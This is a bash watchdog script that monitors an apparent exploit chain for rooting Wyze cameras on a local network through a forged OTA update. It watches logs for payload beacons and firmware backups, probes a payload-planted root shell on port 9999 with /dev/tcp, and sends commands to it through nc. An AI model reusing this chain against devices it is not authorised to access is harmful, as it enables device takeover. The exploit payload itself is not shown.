#!/bin/bash
# Liberation chain watchdog v2: beacon/backup/tar detection + telnetd auto-probe
HERE="$(cd "$(dirname "$0")/../scripts" && pwd)"
ROOT_PROOF="$HERE/root_proof.py"
WAIT_LEDGER="$HERE/wait_ledger.py"
PY=/opt/homebrew/bin/python3
proof() { # proof <ip> <vector...> — machine-checkable RootProof, best-effort
  [ -x "$PY" ] && [ -f "$ROOT_PROOF" ] && "$PY" "$ROOT_PROOF" "$@" >> /tmp/liberation_proofs.log 2>&1 || true
}
waits() { # waits record <cam> <expectation> <state> <note> — negative-evidence ledger, best-effort
  [ -x "$PY" ] && [ -f "$WAIT_LEDGER" ] && "$PY" "$WAIT_LEDGER" record --cam "$1" \
    --expectation "$2" --state "$3" --note "$4" --tag liberation-watch >/dev/null 2>&1 || true
}
B0=$(grep -c BEACON /tmp/fss_beacons.log 2>/dev/null); B0=${B0:-0}
T0=$(grep -ac 'GET.*4.52.17.32.tar' /tmp/ota/forge.log 2>/dev/null || echo 0)
while true; do
  B=$(grep -c BEACON /tmp/fss_beacons.log 2>/dev/null || echo 0)
  SZ=$(du -sk /tmp/fwbackup 2>/dev/null | cut -f1)
  TAR=$(grep -ac 'GET.*4.52.17.32.tar' /tmp/ota/forge.log 2>/dev/null || echo 0)
  D5=$(grep -ac 'GET.*50199' /tmp/ota/forge.log 2>/dev/null || echo 0)
  echo "$(date '+%H:%M:%S') beacons=$B backupKB=${SZ:-0} tar=$TAR(Δ$((TAR-T0))) fetch50199=$D5"
  if [ "$B" -gt "$B0" ]; then
    echo "$(date '+%H:%M:%S') *** NEW BEACON — payload executed ***"
    grep BEACON /tmp/fss_beacons.log | tail -1
    for cam in 39 51; do
      mkdir -p /tmp/pane1/192.168.4.$cam
      if timeout 4 bash -c "exec 3<>/dev/tcp/192.168.4.$cam/9999" 2>/dev/null; then
        echo "$(date '+%H:%M:%S') *** ROOT SHELL on .$cam:9999 — capturing id + RootProof ***"
        (printf 'id > /tmp/root_proof.txt; cat /proc/version >> /tmp/root_proof.txt\n'; sleep 2) | timeout 8 nc 192.168.4.$cam 9999 > /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null
        echo "$(date '+%H:%M:%S') proof bytes: $(wc -c < /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null)"
        proof "192.168.4.$cam" telnet9999
        proof "192.168.4.$cam" beacon-uid0
        waits "wyze-192.168.4.$cam" "root shell via payload telnetd :9999" observed \
          "beacon + shell captured by liberation_watch $(date '+%F %T')"
      fi
    done
    B0=$B
  fi
  [ "$TAR" -gt "$T0" ] && { echo "$(date '+%H:%M:%S') *** CAPSULE FETCHED (0x1fe fired — OTA install starting) ***"; T0=$TAR; }
  [ "${SZ:-0}" -gt 100 ] && { echo "$(date '+%H:%M:%S') *** BACKUPS ARRIVING — flash imminent ***"; \
    waits "wyze-.39/.51" "partition backups streamed to 444-449 before flash" observed "backupKB=$SZ $(date '+%F %T')"; }
  sleep 60
done
